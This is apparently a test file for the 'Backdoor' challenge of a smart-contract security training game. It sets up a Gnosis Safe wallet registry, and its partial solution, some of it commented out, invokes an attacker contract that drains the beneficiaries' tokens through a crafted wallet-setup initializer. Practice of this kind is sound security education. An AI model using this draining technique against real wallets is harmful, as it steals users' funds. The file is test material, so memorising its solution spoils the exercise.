const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
        }

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // const approveData = token.interface.encodeFunctionData("approve", player.address, 10n * 10n ** 18n);
        // const initializer = masterCopy.interface.encodeFunctionData(
        //     "setup", 
        //     [[users[0]],
        //     1, 
        //     token.address,
        //     approveData, 
        //     ethers.constants.AddressZero, 
        //     ethers.constants.AddressZero, 
        //     0,
        //     ethers.constants.AddressZero]
        // );
        
        // const GnosisSafeProxyFactory = await ethers.getContractFactory('GnosisSafeProxy', deployer);
        // const saltNonceWithCallback =  ethers.utils.solidityKeccak256(["uint256", "address"], [0, walletRegistry.address]);
        // const salt = ethers.utils.solidityKeccak256(["bytes32", "uint256"], [ethers.utils.keccak256(initializer), saltNonceWithCallback]);
        // const deploymentData = ethers.utils.solidityKeccak256(["bytes", "uint256"], [GnosisSafeProxyFactory.bytecode, masterCopy.address]);
        // const futureAddress = ethers.utils.getCreate2Address(walletFactory.address, salt, deploymentData);

        // const domain = {
        //     chainId: 31337,
        //     verifyingContract: futureAddress
        //   };

        //   const types = {
        //     SafeTx: [
        //       {
        //         name: "to",
        //         type: "address",
        //       },
        //       {
        //         name: "value",
        //         type: "uint256",
        //       },
        //       {
        //         name: "data",
        //         type: "bytes",
        //       },
        //       {
        //         name: "operation",
        //         type: "uint8",
        //       },
        //       {
        //         name: "safeTxGas",
        //         type: "uint256",
        //       },
        //       {
        //         name: "baseGas",
        //         type: "uint256",
        //       },
        //       {
        //         name: "gasPrice",
        //         type: "uint256",
        //       },
        //       {
        //         name: "gasToken",
        //         type: "address",
        //       },
        //       {
        //         name: "refundReceiver",
        //         type: "address",
        //       },
        //       {
        //         name: "nonce",
        //         type: "uint256",
        //       },
        //     ],
        //   };

        //   const transferData = token.interface.encodeFunctionData(
        //     "transfer", 
        //     [
        //         player.address,
        //         10n * 10n ** 18n,
        //     ]
        // );

        // const values = {
        //   to: token.address,
        //   value: 10 ** 6,
        //   data: transferData,
        //   operation: 1,
        //   safeTxGas: 2300,
        //   baseGas: 112000,
        //   gasPrice: 3500000000,
        //   gasToken: ethers.constants.AddressZero,
        //   refundReceiver: player.address,
        //   nonce: 0,
        // };

        // const signature = await player._signTypedData(domain, types, values);

        (await ethers.getContractFactory('WalletRegistryAttacker', player)).deploy(
            masterCopy.address,
            walletFactory.address,
            walletRegistry.address,
            token.address,
            users,
            {gasLimit: 1e7});
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
